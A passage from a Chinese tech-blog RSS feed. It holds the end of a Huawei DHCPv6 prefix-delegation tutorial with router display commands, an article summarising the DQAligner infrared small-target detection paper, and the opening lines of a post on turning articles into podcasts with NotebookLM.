dis ipv6 dhcp server pd-in-use     <span class="hljs-comment"># 查看前缀委派分配情况</span>
dis ipv6 dhcp server statistics    <span class="hljs-comment"># 查看DHCPv6服务器统计</span>
dis ipv6 dhcp server pool 1        <span class="hljs-comment"># 查看地址池信息</span>
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d2d04c77d0cc43fe8b84392a187ef926~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiN5YGa6I-c6bif55qE572R5bel:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770879816&amp;x-signature=MqEWz5AduOvl5UVOJXrklGZPFRs%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-22">在R2上查看</h4>
<pre><code class="hljs language-bash" lang="bash">dis ipv6 dhcp client               <span class="hljs-comment"># 查看DHCPv6客户端状态</span>
dis ipv6 dhcp server ip-in-use    <span class="hljs-comment"># 查看R2分配的地址</span>
dis ipv6 dhcp duid                <span class="hljs-comment"># 查看本机DUID</span>
dis ipv6 interface brief          <span class="hljs-comment"># 查看IPv6接口地址</span>
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f0bcf4cddcc94750bcc354375ff6433a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiN5YGa6I-c6bif55qE572R5bel:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770879816&amp;x-signature=nzOoLUHc6Gql%2Bsl3asQNsNAvg2U%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-23">PC1连通性测试</h4>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d4b2406fcc5245e5a3edbf22f0afee79~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiN5YGa6I-c6bif55qE572R5bel:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770879816&amp;x-signature=lwglvmUlcqohdwmRWOi8RVwd0Fk%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-24">PC2 连通性测试</h4>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5ca56b7a2757458f9fbc2b0a8442dbfa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiN5YGa6I-c6bif55qE572R5bel:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770879816&amp;x-signature=2fGDZzd0bs28XrNwnupYBUCikUk%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-25">六、常见问题与排错</h3>
<ol>
<li>
<p><strong>前缀分配失败</strong></p>
<ul>
<li>检查前缀池配置：<code>assign-len</code>不能小于前缀长度</li>
<li>检查客户端DUID是否匹配静态绑定</li>
<li>检查接口是否启用<code>ipv6 dhcp client pd</code></li>
</ul>
</li>
<li>
<p><strong>路由不通</strong></p>
<ul>
<li>检查回程路由配置是否正确</li>
<li>验证链路本地地址可达性</li>
<li>检查RA是否被抑制（<code>undo ipv6 nd ra halt</code>）</li>
</ul>
</li>
<li>
<p><strong>地址获取失败</strong></p>
<ul>
<li>确认M/O标志位设置正确</li>
<li>检查DHCPv6服务器是否启用<code>allow-hint</code></li>
<li>验证网络连通性（链路本地地址可ping通）</li>
</ul>
</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[红外小目标检测新突破！浙大团队提出DQAligner：大位移场景下依然稳定跟踪]]></title>    <link>https://juejin.cn/post/7602936997174657076</link>    <guid>https://juejin.cn/post/7602936997174657076</guid>    <pubDate>2026-02-05T05:32:34.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602936997174657076" data-draft-id="7602929352716419072" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="红外小目标检测新突破！浙大团队提出DQAligner：大位移场景下依然稳定跟踪"/> <meta itemprop="keywords" content="算法,计算机视觉,深度学习"/> <meta itemprop="datePublished" content="2026-02-05T05:32:34.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="CoovallyAIHub"/> <meta itemprop="url" content="https://juejin.cn/user/2461151071843739"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            红外小目标检测新突破！浙大团队提出DQAligner：大位移场景下依然稳定跟踪
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2461151071843739/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    CoovallyAIHub
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T05:32:34.000Z" title="Thu Feb 05 2026 05:32:34 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>红外成像领域的小目标检测一直是个技术难题——目标可能只是几个像素点，还常常淹没在复杂的云层、海面背景或者传感器噪声里。</p>
<p>为了解决这个难题，研究者们开始利用多帧时空信息，但新的问题随之而来：当摄像机或目标快速移动时，传统对齐方法容易“抓瞎”。</p>
<p>最近，来自浙江大学、电子科技大学中山学院以及西班牙埃斯特雷马杜拉大学的研究团队在 IEEE TGRS 2025 上发表了一项创新研究，提出了 DQAligner 框架，为解决大位移红外小目标检测问题提供了全新思路。</p>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d456ef802905499c8b39b56923ef6acc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770874357&amp;x-signature=elcq4ZEPPkXGrPieP5NWP%2FIvscM%3D" alt="图片1.png" loading="lazy"/></p>
<blockquote>
<p><strong>论文地址：</strong> <a href="https://link.juejin.cn?target=https%3A%2F%2Fdoi.org%2F10.1109%2FTGRS.2026.3657842" target="_blank" title="https://doi.org/10.1109/TGRS.2026.3657842" ref="nofollow noopener noreferrer">doi.org/10.1109/TGR…</a></p>
<p>****<strong>代码仓库：</strong> <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fdengfa02%2FDQAligner_MIRSTD" target="_blank" title="https://github.com/dengfa02/DQAligner_MIRSTD" ref="nofollow noopener noreferrer">github.com/dengfa02/DQ…</a></p>
</blockquote>
<h2 data-id="heading-0"><strong>为什么大位移成了多帧检测的噩梦？</strong></h2>
<p>在实际应用中，比如无人机载红外相机或高速移动目标监控，平台抖动和目标机动会导致相邻帧之间出现大幅位移。</p>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ac7e4bfe38e04d58b361559bee42c79f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770874357&amp;x-signature=0JIpksUbvGgRyr%2B%2BVay3NwxSEZs%3D" alt="图片2.png" loading="lazy"/></p>
<p>研究团队发现了一个有趣的现象：长尾效应。在现有训练集中，绝大多数样本的位移都很小（小于10像素的占84%以上），这导致模型在面对不到16%的大位移场景时表现挣扎。</p>
<p>传统的对齐方案，如光流法或可变形卷积网络，通常感受野有限。当目标跳出这个范围，或者背景中有相似干扰物时，模型就会陷入“对齐焦虑”。</p>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0c246e7ff3d64dcca4bbc9130de9cbcf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770874357&amp;x-signature=S9t4ESh9%2B%2F5P%2B5BE3%2BASwG0FB0Y%3D" alt="图片3.png" loading="lazy"/></p>
<h2 data-id="heading-1"><strong>DQAligner：从“硬对齐”到“柔性匹配”</strong></h2>
<p>DQAligner 的核心思想是从全局视角出发，建立更稳健的特征关联，其创新点主要体现在以下几个方面：</p>
<ul>
<li><strong>并行骨干网络设计</strong></li>
</ul>
<p>为了让模型适应“大位移”场景，研究团队引入了全局随机大位移增强策略，模拟平台剧烈抖动。架构上采用并行骨干网络，一次性处理多帧图像。</p>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3e730f38aab44f389936615d0d2b2517~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770874357&amp;x-signature=UpjDhzc2bBOO9Q5aSpLoW1swzME%3D" alt="图片4.png" loading="lazy"/></p>
<p>这种设计将时间维度和Batch维度合并处理，不仅提高了推理效率，还让BatchNorm统计量在时空维度上更稳定，实际上扩大了模型的时间感受野。</p>
<ul>
<li><strong>快速尺度资源分配模块</strong></li>
</ul>
<p>多帧加多尺度通常会导致计算量爆炸。为了兼顾效率，DQAligner设计了快速尺度资源分配模块，把复杂的时空注意力拆解为三个支路：</p>
<ul>
<li>通道分配器：通过全局平均池化提取语义权重</li>
<li>空间分配器：定位关键的空间区域</li>
<li>帧分配器：在时间轴上分配权重</li>
</ul>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b035a247278b44beba539ec546f30d41~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770874357&amp;x-signature=rNCrEV6uaqjz5lFOG%2Bu7s9%2FdVzk%3D" alt="图片5.png" loading="lazy"/></p>
<p>这种设计如同给模型安装了一个“调度中心”，让它知道在哪个尺度、哪一帧、哪个通道该投入更多计算资源。</p>
<ul>
<li><strong>双向共享运动交互机制</strong></li>
</ul>
<p>跨帧运动交互模块通过双向共享注意力机制，让参考帧和当前帧互相“对质”。</p>
<p>其核心逻辑是：如果一个点在正向搜索（参考帧到关键帧）和反向搜索中都能匹配上，那它大概率是真实目标。这种共享机制能让随机的背景噪声在梯度更新中互相抵消，而真正稳定的目标信号则会得到加强。</p>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f684b4302da34e1796cbd52047436cbc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770874357&amp;x-signature=rQqwjLqWBWQi3ZIADaBqkVH6c%2FY%3D" alt="图片6.png" loading="lazy"/></p>
<ul>
<li><strong>动态感受野金字塔对齐</strong></li>
</ul>
<p>对于具体的对齐操作，动态感受野金字塔对齐模块采用金字塔结构。它不再使用固定的卷积核，而是通过动态生成器决定感受野的大小（等效感受野从3x3一直覆盖到49x49）。</p>
<p>这种从粗到精的策略能更好地分解复杂的非线性运动。即使目标跑得快，动态感受野也能“跟得上”。</p>
<ul>
<li><strong>核心创新：类查询存储机制</strong></li>
</ul>
<p>这是DQAligner最核心的创新。类查询存储就像一个拥有“短期记忆”的记事本，通过隐藏状态迭代学习目标的特征。</p>
<p>具体计算流程如下：</p>
<ul>
<li>特征提取：从参考帧提取初始特征</li>
<li>递归更新：通过门控单元不断更新这个全局Query</li>
<li>掩码约束：最后用这个Query去“过滤”对齐后的特征，生成运动掩码</li>
</ul>
<p>这个设计的妙处在于：即使在极端大位移下像素级对齐失败，CQM依然能凭借学到的全局语义信息，直接从当前帧里把目标“搜”出来。这实现了从硬性像素对齐到柔性语义匹配的范式转变。</p>
<h2 data-id="heading-2"><strong>实验结果：性能显著提升</strong></h2>
<p>研究团队在两个重量级数据集上进行了测试：NUDT-MIRSDT（模拟静态平台）和IRDST（真实/模拟移动平台）。</p>
<p>在更具挑战性的IRDST数据集上，DQAligner的表现非常抢眼：</p>
<ul>
<li>IoU达到69.465%</li>
<li>F1分数达到81.982%</li>
</ul>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d023812506554c97b38fb9b77a1c2a02~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770874357&amp;x-signature=AvSMi2gHN1jJRkVrLL%2BWzd8TXeg%3D" alt="图片7.png" loading="lazy"/></p>
<p>参数量仅为0.55M，比很多单帧方法还要轻量</p>
<p>相比之下，之前的多帧SOTA方法如DNANet-DTUM在大位移下的IoU仅为65.49%。</p>
<p>在低信噪比（SCR≤3）的极端情况下，DQAligner的优势更加明显。从ROC曲线可以看出，它的曲线最靠近左上角，意味着在保持高检出率的同时，虚警控制得极好。</p>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a672bfb44d4b4306b31179b5e5db86d7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770874357&amp;x-signature=2xeFQfM9r72pYgpIyHsj6Brb%2B%2FE%3D" alt="图片8.png" loading="lazy"/></p>
<p>可视化结果也印证了这一优势。在一些背景快速移动（如楼房边缘、复杂云层）的场景中，其他方法容易把边缘误判为目标或跟丢目标，而DQAligner能够稳定地锁定真实目标。</p>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/be54b08a4455405e9299572ad7b37a69~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770874357&amp;x-signature=klMOAd0qzJHxbC9ub%2BI0ZfgEtYs%3D" alt="图片9.png" loading="lazy"/></p>
<h2 data-id="heading-3"><strong>技术原理深度解析</strong></h2>
<p>为什么CQM和DFDA如此有效？研究团队通过详尽的消融实验进行了验证。</p>
<p>实验表明，在不同位移（大、中、小）场景下，DFDA负责初步对齐，而CQM负责进一步精细化定位。特别是在大位移场景下，单纯的对齐已经失效，但经过CQM的约束，目标特征依然能被清晰地提取出来。</p>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2da7a35d6a05403a9c6eb599070767d0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770874357&amp;x-signature=U8ggW3iWwFgDjrsSBpdUx8CcV8s%3D" alt="图片10.png" loading="lazy"/></p>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c9ebce4dfa7742d48b3af501f0cd512a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770874357&amp;x-signature=pAkgwm5LyZF7dujSQv%2BLVxjT5CQ%3D" alt="图片11.png" loading="lazy"/></p>
<p>CMI模块的作用也通过实验得到证实：有了双向共享注意力，目标的能量被显著放大，而背景噪声被有效抑制。</p>
<h2 data-id="heading-4"><strong>总结与展望</strong></h2>
<p>DQAligner的成功给我们带来了一个重要启发：在处理动态视觉任务时，不一定非要追求像素级的完美对齐。给模型一个“全局视野”，让它学会利用语义一致性去弥补几何对齐的不足，反而能收到奇效。</p>
<p>这种从“硬对齐”向“柔性匹配”的转变，不仅提升了模型对大位移运动的鲁棒性，也为低信噪比下的弱小目标检测提供了一条新路径。</p>
<p>目前，该项目已在GitHub上完整开源，为红外场景下的目标检测研究提供了一个强大的新基准。对于正在被“跟丢”或“虚警”问题困扰的研究者和工程师来说，DQAligner无疑是一个值得尝试的创新方案。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[NotebookLM 把文章做成 Podcast：我的实际使用记录]]></title>    <link>https://juejin.cn/post/7602940720690921518</link>    <guid>https://juejin.cn/post/7602940720690921518</guid>    <pubDate>2026-02-05T05:31:57.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602940720690921518" data-draft-id="7602935146706255918" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="NotebookLM 把文章做成 Podcast：我的实际使用记录"/> <meta itemprop="keywords" content="AI编程,OpenAI"/> <meta itemprop="datePublished" content="2026-02-05T05:31:57.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="HBLOG"/> <meta itemprop="url" content="https://juejin.cn/user/131597124767479"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            NotebookLM 把文章做成 Podcast：我的实际使用记录
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/131597124767479/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    HBLOG
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T05:31:57.000Z" title="Thu Feb 05 2026 05:31:57 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>最近在整理博客内容的时候，我一直在想一件事：<br/>
<strong>已经写好的文章，能不能顺手变成播客？</strong></p>
